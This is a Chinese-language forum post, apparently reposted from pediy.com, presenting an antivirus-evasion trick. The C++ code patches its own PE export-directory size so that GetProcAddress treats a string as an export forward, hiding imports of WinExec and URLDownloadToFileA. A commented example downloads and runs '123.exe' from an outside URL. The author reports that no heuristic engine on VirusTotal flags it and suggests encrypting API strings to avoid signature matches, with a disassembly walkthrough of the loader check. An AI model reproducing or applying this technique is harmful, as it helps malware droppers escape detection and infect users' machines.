
# 启发式查毒，全过。

> 原文：[`www.pediy.com/kssd/pediy11/115351.html`](https://www.pediy.com/kssd/pediy11/115351.html)

代码：

```
extern "C" __declspec(dllexport) CHAR szFile[100] = {0};
ULONG __stdcall xGetProc( LPCSTR lpszDll, LPCSTR lpszFunc)
{
  static CRITICAL_SECTION cs = {0};
  HMODULE hSelf = NULL;
  PIMAGE_DOS_HEADER pDosHead = NULL;
  PIMAGE_NT_HEADERS pNtHead = NULL;
  PDWORD pExportSize = NULL;

  hSelf = GetModuleHandle( NULL);
  pDosHead = (PIMAGE_DOS_HEADER)hSelf;
  pNtHead = (PIMAGE_NT_HEADERS)((LPBYTE)pDosHead + pDosHead->e_lfanew);
  pExportSize = &pNtHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

  if ( *pExportSize < 0x80000000)
  {
    InitializeCriticalSection( &cs);
    DWORD oldProtect = NULL;
    VirtualProtect( pExportSize, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &oldProtect);
    *pExportSize = 0x80000000;
    VirtualProtect( pExportSize, sizeof(DWORD), oldProtect, &oldProtect);
  }

  EnterCriticalSection( &cs);
  strcpy_s( szFile, lpszDll);
  strcat_s( szFile, ".");
  strcat_s( szFile, lpszFunc);
  ULONG uRet = (ULONG)GetProcAddress( hSelf, "szFile");
  LeaveCriticalSection( &cs);

  return uRet;

}
```

代码：

```
//   xGetProc( "kernel32", "WinExec");
//   ((void ((__stdcall *)xGetProc( "urlmon", "URLDownloadToFileA"))(int,char*,char*,int,int))
//     (0, "htt://www.123123.com/123.exe", "123.exe", 0, 0);
// 。。。。。。。
```

清理代码。

上面是演示代码

`https://www.virustotal.com/zh-cn/`

这上面杀毒的启发查毒引擎全查不出来。

当然，有些引擎直接匹配字串“`URLDownloadToFileA`”之类的 得把字串加密一下。

这实际上是利用了 `Export Forward`。

`xGetProc` 函数通过修改自身内存映像的 `pNtHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size` 为 `0x80000000`，来欺骗 `GetProcAddress` 函数。

实际上是欺骗 `GetProcAddress` 最终调用的 `LdrpSnapThunk` 函数，使其认为找到的该导出符号地址刚好在 `IMAGE_EXPORT_DIRECTORY` 结构中（大于 `IMAGE_EXPORT_DIRECTORY` 结构指针，又小于 `IMAGE_EXPORT_DIRECTORY` 结构指针加上这个 `Size`，后者是用一个无符号数比较来判断的，这里 `Size` 被改成了 `0x80000000` 使得后者永远满足），而这正是 `Export Forward` 的识别方法，则该函数认为它是一个 `Export Forward`，这时即认为该位置是一个说明真正函数名称的字符串（即程序自己写进去的 `urlmon.URLDownloadToFileA` 或 `kernel32.WinExec`），从而读取该字符串并找到相应的地址，因此通过这个方法可以获取这两个函数的地址。

`LdrpSnapThunk` 函数中相应的细节如下，注意最后那个 `jnb`：

```
.text:7C937C97

.text:7C937C9D                  mov     eax, [esi+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
.text:7C937CA0                  add     eax, [ebp+Base]
.text:7C937CA3                  mov     edi, [ebp+Base]
.text:7C937CA6                  lea     eax, [eax+ecx*4]
.text:7C937CA9                  mov     ecx, [eax]
.text:7C937CAB                  add     ecx, edi        ; 找到的函数偏移加基址得到函数地址
.text:7C937CAD                  cmp     ecx, esi        ; esi 为 IMAGE_EXPORT_DIRECTORY 结构指针
.text:7C937CAF                  mov     edi, [ebp+arg_C]
.text:7C937CB2                  mov     [edi], ecx
.text:7C937CB4                  ja      loc_7C937F7C    ; 函数指针大于 IMAGE_EXPORT_DIRECTORY 结构指针则跳，这里一般都会满足
.text:7C937F7C loc_7C937F7C:                       ; CODE XREF: LdrpSnapThunk(x,x,x,x,x,x,x,x)+C3j
.text:7C937F7C                  mov     edi, [ebp+Size]
.text:7C937F7F                  add     esi, edi        ; 把 IMAGE_EXPORT_DIRECTORY 结构指针再加上前面取到的 Size，再进行比较，这里由于程序的修改，这个 Size 是 0x80000000
.text:7C937F81                  cmp     ecx, esi
.text:7C937F83                  jnb     loc_7C937CBA    ; 无符号数比较，不低于则跳转。
.text:7C937F83                                            ; 由于这里是无符号数比较，所以总有函数地址<0x80000000+IMAGE_EXPORT_DIRECTORY 结构指针而没有跳走，就被认为是 Export Forward 了。
```
